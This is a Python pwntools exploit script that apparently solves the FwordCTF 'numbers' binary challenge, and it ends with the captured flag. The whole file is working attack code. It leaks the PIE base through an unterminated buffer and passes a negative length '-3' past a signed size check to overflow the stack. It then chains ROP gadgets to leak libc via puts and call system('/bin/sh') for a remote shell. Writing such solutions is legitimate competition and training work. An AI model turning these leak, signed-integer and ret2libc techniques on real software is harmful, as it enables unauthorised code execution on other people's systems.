#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('numbers')

host = args.HOST or 'numbers.fword.wtf'
port = int(args.PORT or 1237)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
pie b*0x940
continue
'''.format(**locals())

# -- Exploit goes here --

def leak_addr(number):
    io.sendlineafter("do you have any number in mind ??", str(number))
    payload = "A"*(number-1)
    io.sendlineafter("are yo sure ??", payload)
    io.recvline()
    io.recvline()
    leak = io.recvline()
    leak = u64(leak.strip().ljust(8, "\x00"))
    return leak



io = start()

piebase = leak_addr(24) - 2281 # offset found in gdb

log.success("piebase: " + hex(piebase))
exe.address = piebase


io.sendlineafter("try again ?", "")
io.sendlineafter("do you have any number in mind ??", "-3") # negative number <=60 in signed comparision. Will read a lot of data

# Rop chain to leak libc
rop_exe =  ROP(exe)
rop_exe.puts(exe.got.puts)
rop_exe.call(piebase + 0x9c5) # main

#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') # local
libc = ELF('./libc6_2.28-0ubuntu1_amd64.so') # remote


# create payload
payload = "A"*64
payload += "B"*8
payload += str(rop_exe)

io.sendafter("are yo sure ??", payload)
io.recvuntil("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB")

io.recv(6)
libcleak = io.recvline()
libcleak = u64(libcleak.strip().ljust(8, "\x00"))

libc.address = libcleak - libc.sym.puts

log.success("libc address: " + hex(libc.address))

# ropped to main after leak
io.sendlineafter("do you have any number in mind ??", "-3") # negative number <=60 in signed comparision. Will read a lot of data

# create system('/bin/sh') rop chain
rop = ROP(libc)
rop.puts(libc.sym.puts) # stupid pivot because of 0x10 alignment for rsp
rop.system(next(libc.search("/bin/sh")))

#print rop.dump()

payload = "A"*64
payload += "B"*8
payload += str(rop)

io.sendafter("are yo sure ??", payload)
io.recvuntil("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB")

io.interactive()

# FwordCTF{s1gN3d_nuMb3R5_c4n_b3_d4nG3r0us}
